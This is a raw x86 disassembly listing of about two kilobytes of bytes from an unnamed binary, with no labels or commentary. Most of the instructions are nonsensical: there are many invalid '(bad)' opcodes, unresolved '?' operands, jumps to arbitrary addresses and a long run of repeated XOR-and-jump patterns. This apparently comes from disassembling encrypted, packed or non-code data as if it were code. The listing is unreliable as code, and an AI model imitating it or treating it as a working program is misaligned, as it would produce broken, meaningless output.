  416a3b:	pop    es
  416a3c:	cmp    bl,BYTE PTR [ecx-0x31]
  416a3f:	dec    esp
  416a40:	cmp    al,0x33
  416a42:	cmp    BYTE PTR [ebx+0x3c],dl
  416a45:	xor    al,0x9b
  416a47:	jmp    0xa07584a0
  416a4c:	sub    BYTE PTR [ebx],ah
  416a4e:	shl    BYTE PTR [ebx],cl
  416a50:	ror    BYTE PTR [eax],1
  416a52:	mov    esi,0xb46a34e3
  416a57:	dec    esp
  416a58:	jge    0x416a70
  416a5a:	mul    DWORD PTR [ebp-0x18]
  416a5d:	jnp    0x416a64
  416a5f:	test   BYTE PTR [esi-0x35],0xfa
  416a63:	(bad)  
  416a64:	jmp    0xc0cc85ee
  416a69:	mov    dh,al
  416a6b:	dec    esi
  416a6c:	int    0xbe
  416a6e:	fiadd  DWORD PTR [edi+0x500e21c7]
  416a74:	test   BYTE PTR [ebp+ebp*8-0x73],cl
  416a78:	jmp    0x416aa5
  416a7a:	xor    eax,0xe22d8991
  416a7f:	pop    ebx
  416a80:	cmc    
  416a81:	outs   dx,BYTE PTR ds:[esi]
  416a82:	mov    bl,0x4d
  416a84:	add    DWORD PTR [ecx],0xffffffc6
  416a87:	jo     0x416abd
  416a89:	jno    0x416a3f
  416a8b:	dec    esp
  416a8c:	jge    0x416aa4
  416a8e:	mul    DWORD PTR [eax+ebp*8+0x17]
  416a92:	cdq    
  416a93:	push   0x70da2b46
  416a98:	jmp    0xc062f12d
  416a9d:	adc    BYTE PTR [ebp-0x1f],ch
  416aa0:	int    0xe2
  416aa2:	inc    edi
  416aa3:	sub    al,0xc7
  416aa5:	adc    DWORD PTR [ebx-0x64dd7b36],edx
  416aab:	es jmp 0x416ae3
  416aae:	test   al,0xc
  416ab0:	mov    DWORD PTR ds:0xbf5d89a,esp
  416ab6:	je     0x416b0e
  416ab8:	or     BYTE PTR ss:[esi+0x1a5434e3],bh
  416abf:	xor    al,0xa0
  416ac1:	sub    BYTE PTR [ecx+0x1d],bl
  416ac4:	xor    eax,0x9b10365e
  416ac9:	jmp    0xa0758522
  416ace:	sub    BYTE PTR [ecx+0x1d],bl
  416ad1:	xor    eax,0xcb10365e
  416ad6:	lods   al,BYTE PTR ds:[esi]
  416ad7:	push   esp
  416ad8:	sbb    bh,BYTE PTR [eax-0x5f]
  416adb:	sub    ebx,DWORD PTR [ecx+0x7b]
  416ade:	jnp    0x416af3
  416ae0:	jns    0x416af2
  416ae2:	fwait
  416ae3:	jmp    0xa075853c
  416ae8:	sub    BYTE PTR [ecx+0x3d5f371d],bh
  416aee:	adc    DWORD PTR [ecx+0x30f854e9],edx
  416af4:	mov    al,ds:0x351bdd28
  416af9:	pop    esi
  416afa:	adc    BYTE PTR ss:[ebx+0x341ae9aa],bl
  416b01:	mov    al,ds:0x351d5938
  416b06:	pop    esi
  416b07:	xor    edx,DWORD PTR [eax]
  416b09:	fwait
  416b0a:	jmp    0xb0758523
  416b0f:	sub    BYTE PTR [ecx+0x1d],bl
  416b12:	aaa    
  416b13:	pop    esi
  416b14:	ss adc eax,0x1a54e89b
  416b1a:	xor    al,0xa0
  416b1c:	sub    BYTE PTR [ebp+ebx*1+0x34],bl
  416b20:	pop    esi
  416b21:	adc    BYTE PTR ss:[ebx+0x382a54e9],bl
  416b28:	mov    al,ds:0x351d5d28
  416b2d:	push   esp
  416b2e:	enter  0x9b14,0xeb
  416b32:	push   esp
  416b33:	pop    edx
  416b34:	mov    ch,0xa0
  416b36:	sub    BYTE PTR [ecx+0x1d],cl
  416b39:	xor    eax,0x9b10364e
  416b3e:	jmp    0xb0758587
  416b43:	sub    BYTE PTR [ecx+0x1d],bl
  416b46:	xor    eax,0x9b00365e
  416b4b:	jmp    0xa07585a4
  416b50:	sub    BYTE PTR [ecx+0x1d],bl
  416b53:	xor    eax,0x9710325e
  416b58:	jmp    0xa075846a
  416b5d:	sub    BYTE PTR [ecx+0x90b3516],bl
  416b63:	adc    BYTE PTR [ebx+0x341a54e9],bl
  416b69:	mov    al,ds:0x351d5928
  416b6e:	pop    esi
  416b6f:	adc    BYTE PTR ss:[ebx+0x341a54e9],bl
  416b76:	and    BYTE PTR [ecx+ebx*2],0x5
  416b7a:	xor    eax,0x9b10365e
  416b7f:	jmp    0xa07585d8
  416b84:	sub    BYTE PTR [ecx+0x1d],bl
  416b87:	xor    eax,0x9b10365e
  416b8c:	jmp    0xa07585e5
  416b91:	sub    BYTE PTR [ecx+0x1d],bl
  416b94:	xor    eax,0x9b10365e
  416b99:	jmp    0xa07585f2
  416b9e:	sub    BYTE PTR [ecx+0x1d],bl
  416ba1:	xor    eax,0x9b10365e
  416ba6:	jmp    0xa07585ff
  416bab:	sub    BYTE PTR [ecx+0x1d],bl
  416bae:	xor    eax,0x9b10365e
  416bb3:	jmp    0xa075860c
  416bb8:	sub    BYTE PTR [ecx+0x1d],bl
  416bbb:	xor    eax,0x9b10365e
  416bc0:	jmp    0xa0758619
  416bc5:	sub    BYTE PTR [ecx+0x1d],bl
  416bc8:	xor    eax,0x9b10365e
  416bcd:	(bad)  
  416bce:	and    BYTE PTR [edi+0x4c],bh
  416bd1:	aam    0x28
  416bd3:	pop    ecx
  416bd4:	sbb    eax,0x103dee35
  416bd9:	fwait
  416bda:	stc    
  416bdb:	push   esp
  416bdc:	sbb    dh,BYTE PTR [esi+eax*8]
  416bdf:	sub    al,0x59
  416be1:	sbb    eax,0x40365e31
  416be6:	fisubr WORD PTR [edx-0x5f84b19a]
  416bec:	sub    BYTE PTR [ecx+0x1d],bl
  416bef:	xor    eax,0x9b10165e
  416bf4:	or     DWORD PTR [edx+0x68],edi
  416bf7:	inc    edi
  416bf8:	ror    BYTE PTR [ebx+0x59],cl
  416bfb:	sbb    eax,0x10565e35
  416c00:	fwait
  416c01:	jmp    0xa0757d9a
  416c06:	jp     0x416c61
  416c08:	sbb    eax,0x10323435
  416c0d:	fwait
  416c0e:	jmp    0xa0758667
  416c13:	sub    BYTE PTR [ecx+0x1d],bl
  416c16:	xor    eax,0x9b30365e
  416c1b:	jmp    0xc587a0d4
  416c20:	inc    esp
  416c21:	ss jle 0x416c59
  416c24:	pop    esi
  416c25:	adc    bl,BYTE PTR ss:[ebx+0x383a54e9]
  416c2c:	mov    al,ds:0x351d5b28
  416c31:	pop    esi
  416c32:	mov    dl,BYTE PTR [ebx+ebx*4]
  416c35:	jmp    0xa075868e
  416c3a:	sub    BYTE PTR [ecx+0x1d],bl
  416c3d:	xor    eax,0xdb10365e
  416c42:	jmp    0xa076469b
  416c47:	sub    BYTE PTR [ecx+0x1d],bl
  416c4a:	xor    eax,0x9b10365e
  416c4f:	jmp    0xa07586a8
  416c54:	sub    BYTE PTR [ecx+0x1d],bl
  416c57:	xor    eax,0x9b10365e
  416c5c:	jmp    0xa07586b5
  416c61:	sub    BYTE PTR [ecx+0x1d],bl
  416c64:	xor    eax,0x9b10365e
  416c69:	jmp    0xa07586c2
  416c6e:	sub    BYTE PTR [ecx+0x1d],bl
  416c71:	xor    eax,0x9b10365e
  416c76:	jmp    0xa07586cf
  416c7b:	sub    BYTE PTR [ecx+0x1d],bl
  416c7e:	xor    eax,0x9b10365e
  416c83:	jmp    0xa07586dc
  416c88:	sub    BYTE PTR [ecx+0x1d],bl
  416c8b:	xor    eax,0x9b10365e
  416c90:	jmp    0xa07586e9
  416c95:	sub    BYTE PTR [ecx+0x1d],bl
  416c98:	xor    eax,0x9b10365e
  416c9d:	jmp    0xa07586f6
  416ca2:	sub    BYTE PTR [ecx+0x1d],bl
  416ca5:	xor    eax,0x9b10365e
  416caa:	jmp    0xa0758703
  416caf:	sub    BYTE PTR [ecx+0x1d],bl
  416cb2:	xor    eax,0x9b10365e
  416cb7:	jmp    0xa0758710
  416cbc:	sub    BYTE PTR [ecx+0x1d],bl
  416cbf:	xor    eax,0x9b10365e
  416cc4:	jmp    0xa075871d
  416cc9:	sub    BYTE PTR [ecx+0x1d],bl
  416ccc:	xor    eax,0x9b10365e
  416cd1:	jmp    0xa075872a
  416cd6:	sub    BYTE PTR [ecx+0x1d],bl
  416cd9:	xor    eax,0x9b10365e
  416cde:	jmp    0xa0758737
  416ce3:	sub    BYTE PTR [ecx+0x1d],bl
  416ce6:	xor    eax,0x9b10365e
  416ceb:	jmp    0xa0758744
  416cf0:	sub    BYTE PTR [ecx+0x1d],bl
  416cf3:	xor    eax,0x9b10365e
  416cf8:	jmp    0xa0758751
  416cfd:	sub    BYTE PTR [ecx+0x1d],bl
  416d00:	xor    eax,0x9b10365e
  416d05:	jmp    0xa075875e
  416d0a:	sub    BYTE PTR [ecx+0x1d],bl
  416d0d:	xor    eax,0x9b10365e
  416d12:	jmp    0xa075876b
  416d17:	sub    BYTE PTR [ecx+0x1d],bl
  416d1a:	xor    eax,0x9b10365e
  416d1f:	jmp    0xa0758778
  416d24:	sub    BYTE PTR [ecx+0x1d],bl
  416d27:	xor    eax,0x9b10365e
  416d2c:	jmp    0xa0758785
  416d31:	sub    BYTE PTR [ecx+0x1d],bl
  416d34:	xor    eax,0x9b10365e
  416d39:	jmp    0xa0758792
  416d3e:	sub    BYTE PTR [ecx+0x1d],bl
  416d41:	xor    eax,0x9b10365e
  416d46:	jmp    0xa075879f
  416d4b:	sub    BYTE PTR [ecx+0x1d],bl
  416d4e:	xor    eax,0x9b10365e
  416d53:	jmp    0xa07587ac
  416d58:	sub    BYTE PTR [ecx+0x1d],bl
  416d5b:	xor    eax,0x9b10365e
  416d60:	jmp    0xa07587b9
  416d65:	sub    BYTE PTR [ecx+0x1d],bl
  416d68:	xor    eax,0x9b10365e
  416d6d:	jmp    0xa07587c6
  416d72:	sub    BYTE PTR [ecx+0x1d],bl
  416d75:	xor    eax,0x9b10365e
  416d7a:	jmp    0xa07587d3
  416d7f:	sub    BYTE PTR [ecx+0x1d],bl
  416d82:	xor    eax,0x9b10365e
  416d87:	jmp    0xa07587e0
  416d8c:	sub    BYTE PTR [ecx+0x1d],bl
  416d8f:	xor    eax,0x9b10365e
  416d94:	jmp    0xa07587ed
  416d99:	sub    BYTE PTR [ecx+0x1d],bl
  416d9c:	xor    eax,0x9b10365e
  416da1:	jmp    0xa07587fa
  416da6:	sub    BYTE PTR [ecx+0x1d],bl
  416da9:	xor    eax,0x9b10365e
  416dae:	jmp    0xa0758807
  416db3:	sub    BYTE PTR [ecx+0x1d],bl
  416db6:	xor    eax,0x9b10365e
  416dbb:	jmp    0xa0758814
  416dc0:	sub    BYTE PTR [ecx+0x1d],bl
  416dc3:	xor    eax,0x9b10365e
  416dc8:	jmp    0xa0758821
  416dcd:	adc    DWORD PTR [edi],0x16
  416dd0:	xor    eax,0x8b103671
  416dd5:	jmp    0x7ad79e2e
  416dda:	pop    esp
  416ddb:	in     al,0x52
  416ddd:	push   es
  416dde:	dec    esp
  416ddf:	sbb    eax,0xe106a62b
  416de4:	mov    BYTE PTR [edx],dh
  416de6:	jmp    0x8703165c
  416deb:	dec    ebp
  416dec:	jno    0x416e19
  416dee:	jb     0x416e21
  416df0:	fistp  WORD PTR [eax+0x45]
  416df3:	(bad)
  416df8:	and    edx,0xb784f850
  416dfe:	mov    eax,ds:0x506b85e5
  416e03:	xchg   ebp,eax
  416e04:	mov    ch,0x49
  416e06:	retf   
  416e07:	xor    BYTE PTR [edx+0x781817d1],ah
  416e0d:	out    0xf0,eax
  416e0f:	(bad)
  416e12:	pusha  
  416e13:	test   esi,esp
  416e15:	outs   dx,DWORD PTR ds:[esi]
  416e16:	lock inc ebx
  416e18:	push   esp
  416e19:	(bad)
  416e1c:	(bad)  
  416e1f:	rol    esi,0xba
  416e22:	mov    eax,ds:0xc851d144
  416e27:	or     al,bh
  416e29:	mov    edi,0xd782a23c
  416e2e:	mov    edi,DWORD PTR [ebx+edi*4+0x55741e61]
  416e35:	push   cs
  416e36:	cmp    eax,0xe23daa0
  416e3b:	inc    ebp
  416e3c:	sub    al,0x1d
  416e3e:	sub    BYTE PTR [ebx+0x2c],cl
  416e41:	mov    eax,0xbfbf3c3d
  416e46:	jp     0x416e5d
  416e48:	cmp    BYTE PTR [edi+0x72],0x36
  416e4c:	popa   
  416e4d:	sub    eax,0x487dbf43
  416e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e53:	cmc    
  416e54:	les    ecx,FWORD PTR [ebp+0x4c728fe9]
  416e5a:	stos   BYTE PTR es:[edi],al
  416e5b:	and    al,0xbd
  416e5d:	push   ds
  416e5e:	xchg   esp,eax
  416e5f:	int3   
  416e60:	push   0x9
  416e62:	xor    BYTE PTR [ecx],al
  416e64:	lahf   
  416e65:	js     0x416e70
  416e67:	(bad)  
  416e68:	ja     0x416e87
  416e6a:	ja     0x416e73
  416e6c:	jae    0x416eea
  416e6e:	int    0x48
  416e70:	push   ecx
  416e71:	and    BYTE PTR [ebx-0x3b916117],bl
  416e77:	mov    WORD PTR [ecx],gs
  416e79:	imul   ebp,DWORD PTR [edx],0x2da60df7
  416e7f:	jg     0x416e34
  416e81:	pop    esp
  416e82:	adc    al,0xc0
  416e84:	aam    0x95
  416e86:	lock mov DWORD PTR ds:0xfc4eab7c,edx
  416e8d:	inc    ebx
  416e8e:	xchg   edi,eax
  416e8f:	inc    edi
  416e90:	mov    ebx,0x4d6aadb4
  416e95:	mov    ebp,0x8d41463b
  416e9a:	ins    DWORD PTR es:[edi],dx
  416e9b:	std    
  416e9c:	lock xchg edx,eax
  416e9e:	enter  0xfd1c,0x3d
  416ea2:	xchg   esi,eax
  416ea3:	xchg   esp,eax
  416ea4:	xchg   esi,eax
  416ea5:	and    BYTE PTR [esi-0x2330e9e1],0xc3
  416eac:	test   BYTE PTR [edx],0x3d
  416eaf:	out    dx,eax
  416eb0:	push   ecx
  416eb1:	jb     0x416f14
  416eb3:	mov    esp,0xa8bf98d6
  416eb8:	xlat   BYTE PTR ds:[ebx]
  416eb9:	test   ebx,edx
  416ebb:	jbe    0x416e6d
  416ebd:	int3   
  416ebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ebf:	scas   eax,DWORD PTR es:[edi]
  416ec0:	and    eax,0x43078ed4
  416ec5:	cmc    
  416ec6:	xlat   BYTE PTR ds:[ebx]
  416ec7:	shl    DWORD PTR [ebx-0x17],cl
  416eca:	and    BYTE PTR [edi-0x34],cl
  416ecd:	nop
  416ece:	mov    dh,0xda
  416ed0:	cmp    dl,dh
  416ed2:	mov    dh,0x28
  416ed4:	call   0xf129:0x99fa374d
  416edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416edc:	test   BYTE PTR [ebp-0x78],0x59
  416ee0:	xlat   BYTE PTR ds:[ebx]
  416ee1:	pop    ds
  416ee2:	xchg   edx,eax
  416ee3:	and    eax,0x8ea0ec2e
  416ee8:	mov    cl,0x79
  416eea:	xchg   edi,eax
  416eeb:	inc    ebp
  416eec:	out    0xa3,al
  416eee:	out    0x80,al
  416ef0:	mov    ds:0xade8fbc5,eax
  416ef5:	xchg   ebx,eax
  416ef6:	cmc    
  416ef7:	pusha  
  416ef8:	cwde   
  416ef9:	xor    BYTE PTR [eax+0x57ec3a79],bh
  416eff:	inc    esi
  416f00:	loope  0x416f04
  416f02:	in     al,dx
  416f03:	push   esi
  416f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f05:	pop    ebx
  416f06:	test   DWORD PTR [ebp-0x1e3b428f],ecx
  416f0c:	ja     0x416ecb
  416f0e:	and    dl,bh
  416f10:	mov    BYTE PTR [ecx],dl
  416f12:	clc    
  416f13:	cs or  eax,0xa8e5d323
  416f19:	jnp    0x416ef8
  416f1b:	leave  
  416f1c:	push   ecx
  416f1d:	jo     0x416f81
  416f1f:	ret    
  416f20:	imul   DWORD PTR [edx+0x40]
  416f23:	mov    esp,0x375d48d5
  416f28:	or     al,0x35
  416f2a:	mov    ecx,0xb02c162e
  416f2f:	in     eax,dx
  416f30:	(bad)  
  416f31:	lods   al,BYTE PTR ds:[esi]
  416f32:	inc    esp
  416f33:	fisttp WORD PTR [edi]
  416f35:	mov    eax,0xf2ebb6e
  416f3a:	xor    DWORD PTR [esi+ebp*4-0x72],edx
  416f3e:	mov    ebp,0x2c5f635f
  416f43:	daa    
  416f44:	or     edi,edx
  416f46:	clc    
  416f47:	stc    
  416f48:	jp     0x416f27
  416f4a:	mov    al,0x64
  416f4c:	ins    DWORD PTR es:[edi],dx
  416f4d:	popf   
  416f4e:	pop    es
  416f4f:	add    eax,0xb370d66e
  416f54:	test   BYTE PTR [ecx],cl
  416f56:	test   al,0xb3
  416f58:	les    edi,FWORD PTR [esi-0x28ddeb2c]
  416f5e:	(bad)  
  416f5f:	lock sbb BYTE PTR [eax-0x258e0107],al
  416f66:	mov    DWORD PTR [edi+ecx*1+0x2f],esp
  416f6a:	into   
  416f6b:	mov    WORD PTR [ebx-0x1b9c6c96],fs
  416f71:	pop    ss
  416f72:	cmc    
  416f73:	xchg   esp,eax
  416f74:	pop    esp
  416f75:	jnp    0x416f10
  416f77:	popf   
  416f78:	mov    al,0xb9
  416f7a:	je     0x416fb9
  416f7c:	mov    bh,0x51
  416f7e:	scas   eax,DWORD PTR es:[edi]
  416f7f:	sahf   
  416f80:	mov    ds:0xe4d79758,al
  416f85:	fisub  WORD PTR [edx]
  416f87:	jne    0x416f30
  416f89:	mov    ebx,0x656efa37
  416f8e:	mov    ebx,0x63f081e9
  416f93:	(bad)  
  416f94:	xor    eax,DWORD PTR [edi+0x6b]
  416f97:	add    DWORD PTR [ecx],0x37374d4c
  416f9d:	jge    0x416f45
  416f9f:	jecxz  0x416f42
  416fa1:	adc    DWORD PTR [edi+0x594575f3],ecx
  416fa7:	add    al,0x4f
  416fa9:	pop    ss
  416faa:	js     0x416ff8
  416fac:	retf   0x2697
  416faf:	push   ecx
  416fb0:	sub    DWORD PTR [edi-0x666fedda],0xfffffff7
  416fb7:	call   0xb702:0xfdb5b0cc
  416fbe:	add    cl,BYTE PTR [ecx+edi*8+0x17]
  416fc2:	loope  0x416fc7
  416fc4:	push   esp
  416fc5:	fistp  WORD PTR [eax]
  416fc7:	std    
  416fc8:	mov    eax,DWORD PTR [edi+0x3a]
  416fcb:	leavew 
  416fcd:	dec    edx
  416fce:	shl    BYTE PTR [ecx-0x28176e6a],0x13
  416fd5:	mov    ebp,0xae663c9c
  416fda:	in     al,dx
  416fdb:	fwait
  416fdc:	jbe    0x416fe6
  416fde:	xor    al,0xe5
  416fe0:	loop   0x417061
  416fe2:	sub    eax,0x238d4ee5
  416fe7:	mov    ebp,0x5ddda172
  416fec:	mov    al,ds:0xd3fb15a1
  416ff1:	sbb    ah,ch
  416ff3:	mov    DWORD PTR [ebx+0xb],ebx
  416ff6:	rol    BYTE PTR [ebx],0x5b
  416ff9:	(bad)  
  416ffa:	ja     0x41701b
  416ffc:	or     eax,0x9da4fd85
  417001:	(bad)  
  417002:	push   eax
  417003:	fidivr DWORD PTR [edx]
  417005:	xchg   esp,eax
  417006:	imul   ebp,DWORD PTR [eax+0x13],0x9fa7f03b
  41700d:	mov    ds:0x370d31cd,al
  417012:	push   esp
  417013:	ins    DWORD PTR es:[edi],dx
  417014:	mov    bh,0x84
  417016:	and    DWORD PTR [eax-0x7a07e1a8],esi
  41701c:	mov    BYTE PTR [eax],ah
  41701e:	je     0x417093
  417020:	(bad)  
  417021:	stc    
  417022:	iret   
  417023:	nop
  417024:	stos   BYTE PTR es:[edi],al
  417025:	outs   dx,BYTE PTR ds:[esi]
  417026:	shl    BYTE PTR [edi+0x1fc96070],1
  41702c:	xor    bl,al
  41702e:	inc    eax
  41702f:	xchg   edx,eax
  417030:	jmp    0x4170a6
  417032:	jge    0x4170af
  417034:	jae    0x416fdb
  417036:	in     eax,dx
  417037:	addr16 push eax
  417039:	call   0xb6a4f04d
  41703e:	sub    BYTE PTR [ebx-0x7f],0x14
  417042:	pop    esp
  417043:	and    cl,ch
  417045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417046:	sbb    al,0xab
  417048:	and    DWORD PTR ds:0xf731984b,0xfe1f5dcf
  417052:	dec    eax
  417053:	xor    DWORD PTR [esi+0x68],ebx
  417056:	mov    WORD PTR [eax+0x2e],gs
  417059:	jle    0x417069
  41705b:	fst    DWORD PTR [esi]
  41705d:	into   
  41705e:	and    ebp,DWORD PTR [ebx]
  417060:	cli    
  417061:	add    dl,BYTE PTR [esp+ecx*8-0x8994804]
  417068:	jno    0x4170ad
  41706a:	les    ebp,FWORD PTR [ebp-0x1f]
  41706d:	push   cs
  41706e:	out    dx,eax
  41706f:	aas    
  417070:	xchg   ebx,eax
  417071:	fdiv   DWORD PTR [edi+0x3df3ff0e]
  417077:	adc    ebx,edi
  417079:	inc    ebx
  41707a:	ins    BYTE PTR es:[edi],dx
  41707b:	adc    BYTE PTR [ebx],dl
  41707d:	inc    edi
  41707e:	sub    al,0x48
  417080:	xchg   esi,eax
  417081:	xchg   esi,eax
  417082:	add    al,0x60
  417084:	scas   eax,DWORD PTR es:[edi]
  417085:	fnstsw WORD PTR [ecx+0x72]
  417088:	scas   eax,DWORD PTR es:[edi]
  417089:	std    
  41708a:	cmp    al,dl
  41708c:	mov    cl,0x70
  41708e:	test   al,0x2
  417090:	adc    BYTE PTR [ebx-0x1c],dl
  417093:	cmp    edi,DWORD PTR [esi]
  417095:	enter  0xd23,0xea
  417099:	and    ch,ch
  41709b:	in     eax,0xf5
  41709d:	sbb    DWORD PTR [edx],ebx
  41709f:	jmp    0x5fbb:0x49c3b1d
  4170a6:	adc    esp,esi
  4170a8:	pop    eax
  4170a9:	data16 (bad) 
  4170ab:	call   0xf641711d
  4170b0:	pop    esp
  4170b1:	pop    edi
  4170b2:	dec    eax
  4170b3:	mov    eax,0x89bf1db4
  4170b8:	fsub   DWORD PTR [edi]
  4170ba:	cmp    BYTE PTR [ecx],ch
  4170bc:	in     eax,dx
  4170bd:	push   ebx
  4170be:	dec    BYTE PTR [edi+0x26]
  4170c1:	pop    esp
  4170c3:	push   ecx
  4170c4:	mov    bl,0x5d
  4170c6:	es jp  0x4170ac
  4170c9:	aaa    
  4170ca:	std    
  4170cb:	pop    ecx
  4170cc:	xchg   ecx,eax
  4170cd:	in     al,dx
  4170ce:	retf   0xdf1d
  4170d1:	sbb    DWORD PTR [edi],0x931817bc
  4170d7:	xlat   BYTE PTR ds:[ebx]
  4170d8:	(bad)
  4170dc:	fcom   QWORD PTR [ebx]
  4170de:	icebp  
  4170df:	adc    cl,BYTE PTR [edi]
  4170e1:	rcl    BYTE PTR [esi],0xc7
  4170e4:	sbb    BYTE PTR [ebx],ch
  4170e6:	add    esi,DWORD PTR [ecx]
  4170e8:	shl    BYTE PTR [ebp-0x30016499],cl
  4170ee:	cmp    BYTE PTR ds:0x70b9c42c,0x13
  4170f5:	outs   dx,DWORD PTR ds:[esi]
  4170f6:	pop    edx
  4170f7:	sti    
  4170f8:	cmp    DWORD PTR [ebx+0x45],ebp
  4170fb:	adc    BYTE PTR [ebp-0x5354c518],bh
  417101:	bound  esp,QWORD PTR [eax]
  417103:	mov    esi,0xbd78e62b
  417108:	mov    esi,0x9864cd24
  41710d:	add    al,0xee
  41710f:	lods   al,BYTE PTR ds:[esi]
  417110:	jnp    0x4170a7
  417112:	call   0xaee89ca1
  417117:	jl     0x4170ba
  417119:	mov    edi,0xaa123c2d
  41711e:	lahf   
  41711f:	lods   eax,DWORD PTR ds:[esi]
  417120:	jmp    0x1371:0x825e2e7c
  417127:	mov    dh,0xb2
  417129:	jno    0x417103
  41712b:	fcmovb st,st(0)
  41712d:	inc    edi
  41712e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41712f:	popf   
  417130:	das    
  417131:	xchg   ebx,eax
  417132:	jecxz  0x417152
  417134:	popf   
  417135:	xchg   ebx,eax
  417136:	enter  0x3d15,0xd6
  41713a:	test   BYTE PTR ds:0xfe6f36ed,cl
  417140:	in     eax,dx
  417141:	enter  0x86fb,0xf3
  417145:	data16 test al,0xa6
  417148:	lods   al,BYTE PTR ds:[esi]
  417149:	cmc    
  41714a:	sbb    ebp,ebp
  41714c:	jp     0x417133
  41714e:	jl     0x417154
  417150:	pop    esi
  417151:	addr16 xchg ebp,esp
  417154:	in     eax,0x3f
  417156:	ret    0xaa4e
  417159:	mov    eax,ds:0x3fb1a294
  41715e:	into   
  41715f:	clc    
  417160:	cmp    bh,al
  417162:	dec    ebp
  417163:	mov    eax,ds:0x67d8af44
  417168:	pop    esp
  417169:	or     eax,0xeaa3a0b7
  41716e:	repz xor dh,dh
  417171:	jl     0x4171dc
  417173:	and    eax,0x65ca3a5e
  417178:	cmp    DWORD PTR [ebx],ebx
  41717a:	test   eax,0x74d79b6
  41717f:	pop    es
  417180:	test   DWORD PTR [esi+0x7a],0x83414f08
  417187:	mov    ch,0x37
  417189:	out    dx,eax
  41718a:	ins    BYTE PTR es:[edi],dx
  41718b:	outs   dx,DWORD PTR ds:[esi]
  41718c:	add    DWORD PTR [eax-0x114f1d86],esi
  417192:	inc    eax
  417193:	jmp    0x417160
  417195:	in     eax,dx
  417196:	jbe    0x4171ec
  417198:	inc    edi
  417199:	mov    BYTE PTR [edi+0x68],al
  41719c:	mov    ecx,DWORD PTR [ebp-0x2237be6d]
  4171a2:	xor    al,BYTE PTR [ebp-0x3fbe117f]
  4171a8:	imul   edi,DWORD PTR [ebx-0x69],0x981f5ab2
  4171af:	scas   eax,DWORD PTR es:[edi]
  4171b0:	cmp    al,0xe2
  4171b2:	stos   DWORD PTR es:[edi],eax
  4171b3:	mov    ch,0xe7
  4171b5:	test   BYTE PTR [eax+0x77d99ee2],ah
  4171bb:	xchg   edx,eax
  4171bc:	fadd   st,st(6)
  4171be:	ret    
  4171bf:	mov    bh,0xf3
  4171c1:	jne    0x41721c
  4171c3:	std    
  4171c4:	mov    al,ds:0x1159fb67
  4171c9:	cld    
  4171ca:	(bad)  
  4171cb:	sbb    DWORD PTR [ebp+0x228d64fe],edx
  4171d1:	mov    cl,0x17
  4171d3:	fild   WORD PTR [ecx+0x60da5593]
  4171d9:	pop    ebx
  4171da:	or     cl,cl
  4171dc:	add    bh,bh
  4171de:	dec    ebp
  4171df:	push   es
  4171e0:	cld    
  4171e1:	outs   dx,BYTE PTR ds:[esi]
  4171e2:	sub    al,0xe9
  4171e4:	in     eax,0x30
  4171e6:	or     BYTE PTR [ebp-0x78d92b07],ch
  4171ec:	sub    eax,0x38f5196b
  4171f1:	(bad)  
  4171f2:	and    dl,cl
  4171f4:	jno    0x4171ef
  4171f6:	mov    ?,WORD PTR [ebp+0x51768f0e]
  4171fc:	mov    eax,DWORD PTR [eax+ebx*1+0x5]
  417200:	icebp  
  417201:	push   ecx
  417202:	mov    bl,0x2
  417204:	fisttp QWORD PTR [edx+0x60]
  417207:	scas   eax,DWORD PTR es:[edi]
  417208:	test   eax,0x1fbc2d76
  41720d:	jbe    0x41725c
  41720f:	and    esi,DWORD PTR [esi]
  417211:	push   ebp
  417212:	jp     0x417252
  417214:	or     DWORD PTR [ecx+0x24ec53b4],eax
  41721a:	xchg   edx,eax
  41721b:	dec    ebp
  41721c:	xchg   ecx,eax
  41721d:	mov    WORD PTR [edi+0x7f],?
  417220:	(bad)  
  417221:	fist   DWORD PTR [esi+0x6e]
  417224:	test   eax,0x22db082f
  417229:	aad    0x54
  41722b:	inc    esi
  41722c:	dec    esp
  41722d:	and    al,0xf8
  41722f:	out    0xb0,eax
  417231:	sar    DWORD PTR [esi+0xb],cl
  417234:	xchg   ebp,eax
  417235:	rcl    DWORD PTR [edi+0x34],0xaa
  417239:	add    DWORD PTR [esi+0xa],ebx
  41723c:	adc    eax,0xf26c9235
  417241:	or     DWORD PTR [edx],eax
  417243:	xor    al,0x52
  417245:	cmp    al,0x99
  417247:	fimul  DWORD PTR [esi]
  417249:	and    eax,DWORD PTR [edx-0x43dd5ee7]
  41724f:	dec    edx
  417250:	pop    esp
  417251:	or     al,al
  417253:	mov    edx,0xecdef582
  417258:	pop    edi
  417259:	loope  0x4172c4
  41725b:	jbe    0x4171f0
  41725d:	cs cli 
  41725f:	retf   
  417260:	mov    ds:0x524a85db,al
  417265:	or     ah,BYTE PTR [ebx+0x318cfc62]
  41726b:	or     eax,0x4dc606bc
  417270:	(bad)  
  417271:	adc    al,0xcf
  417273:	inc    ebp
  417274:	jns    0x417214
  417276:	cmp    DWORD PTR [eax],0xfdbb9a79
  41727c:	inc    edi
  41727d:	das    
  41727e:	aam    0xd7
  417280:	or     DWORD PTR [esi+eiz*4-0x28c9276f],ebx
  417287:	aad    0x1e
  417289:	rcr    DWORD PTR [esp+edi*4-0x313eb264],1
  417290:	not    BYTE PTR [eax-0x1]
  417293:	not    BYTE PTR [ebx]
  417295:	xchg   BYTE PTR [edx],ah
  417297:	out    0x56,eax
  417299:	mov    ebp,cs
  41729b:	and    DWORD PTR [ebp+0x30ae9ead],0xffffff84
  4172a2:	daa    
  4172a3:	data16 (bad) 
  4172a5:	dec    BYTE PTR [esi+0x59d07da]
  4172ab:	scas   al,BYTE PTR es:[edi]
  4172ac:	adc    dl,bl
  4172ae:	fld    DWORD PTR [eax+0x73]
  4172b1:	(bad)
  4172b4:	aas    
  4172b5:	sbb    dl,BYTE PTR [edx+0x702b7ef8]
  4172bb:	cmp    ecx,esp
  4172bd:	fiadd  DWORD PTR [esi]
  4172bf:	sub    ecx,DWORD PTR [ebx+0x40]
  4172c2:	ret    
  4172c3:	leave  
  4172c4:	add    ch,BYTE PTR [ecx]
  4172c6:	ja     0x41731e
  4172c8:	and    al,0xd0
  4172ca:	xor    eax,0x7968b3ff
  4172cf:	dec    ecx
  4172d0:	xor    DWORD PTR [esi],ebx
  4172d2:	jbe    0x41731e
